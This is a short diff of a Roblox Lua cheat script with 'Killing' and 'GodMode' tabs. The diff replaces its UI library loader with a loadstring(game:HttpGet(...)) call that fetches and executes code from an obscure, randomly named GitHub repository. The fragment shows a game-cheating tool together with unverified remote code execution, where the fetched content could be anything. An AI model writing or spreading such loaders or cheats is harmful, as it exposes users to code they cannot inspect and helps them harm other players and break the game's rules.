@@ -5,16 +5,16 @@ local VirtualUser = game:GetService("VirtualUser")
 local RunService = game:GetService("RunService")
 local Player = Players.LocalPlayer
 local muscleEvent = Player:WaitForChild("muscleEvent")
-local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/memejames/elerium-v2-ui-library//main/Library", true))()
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/fjejehrieii/fjejehrieii/refs/heads/main/fjejehrieii.lua", true))()
 local window = library:AddWindow("Treee | Private | Killing", {
 	main_color = Color3.fromRGB(96, 96, 96),
 	min_size = Vector2.new(438, 606),
 })
-local MainTab = window:AddTab("          Main          ")
+local MainTab = window:AddTab("Main")
 MainTab:Show()
-local KillingTab = window:AddTab("          Killing          ")
-local GodmodeTab = window:AddTab("     GodMode     ")
-local SpecsTab = window:AddTab("     Specs     ")
+local KillingTab = window:AddTab("Killing")
+local GodmodeTab = window:AddTab("GodMode")
+local SpecsTab = window:AddTab("Specs")
 local function removePortals()
     for _, portal in pairs(game:GetDescendants()) do
         if portal.Name == "RobloxForwardPortals" then
